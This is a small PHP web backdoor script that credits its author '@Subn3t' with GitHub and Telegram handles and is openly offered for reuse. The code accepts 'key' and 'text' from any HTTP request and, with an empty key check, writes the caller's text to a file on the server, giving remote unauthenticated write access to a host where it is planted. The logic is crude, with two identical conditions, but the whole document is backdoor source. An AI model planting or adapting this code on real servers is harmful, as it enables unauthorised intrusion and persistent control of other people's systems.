
<?php
/*
- Backdoor File coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- Telegram: @subn3t
- You can use this code, but please give credits.
- Have fun and stay legal!
*/
$key;
$text;
$error;
define("FILENAME", "file");
if (isset($_REQUEST['key'])){
	$key = $_REQUEST['key'];
} else { $error = "Empty key"; }
if (isset($_REQUEST['text'])) {
	$text = $_REQUEST['text'];
} else { $error = "text"; }
if ($key == '') {
	file_put_contents(FILENAME, '$%&'.$text);
}
if ($key == '') {
	file_put_contents(FILENAME, $text);
}
die(json_encode(["error"=>$error]))
?>
